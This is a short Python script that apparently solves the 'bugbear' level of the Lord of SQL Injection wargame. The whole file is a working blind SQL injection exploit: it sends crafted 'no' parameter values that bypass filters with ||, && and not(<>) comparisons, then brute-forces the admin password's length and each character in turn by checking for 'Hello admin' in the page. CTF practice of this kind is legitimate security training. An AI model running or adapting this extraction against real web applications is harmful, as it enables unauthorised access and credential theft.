#-*- coding: utf-8 -*-
import string
from web import *

url = "http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?&no={}"

# get length
# query 0%7C%7Cid%0ain%0a("admin")%0a%26%26length(pw)%0ain%0a(7)
inject_url = '0||not(id<>"admin")&&not(length(pw)<>{})'
for i in range(1, 100):
    req = getRequest(url,inject_url.format(i), show=False)
    page = getPage(req)
    if "Hello admin" in page:
        length = i
        break

print "Length :",length

# get password : brute forcing
password = ""
inject_url = '0||not(id<>"admin")&&not(mid(pw,{},1)<>"{}")'
for i in range(1,length+1):
    for c in string.digits + string.letters:
        req = getRequest(url, inject_url.format(i,c), show=False)
        page = getPage(req)
        if "Hello admin" in page:
            print i,"'th letter is",c
            password += c
            break

print "Password :",password
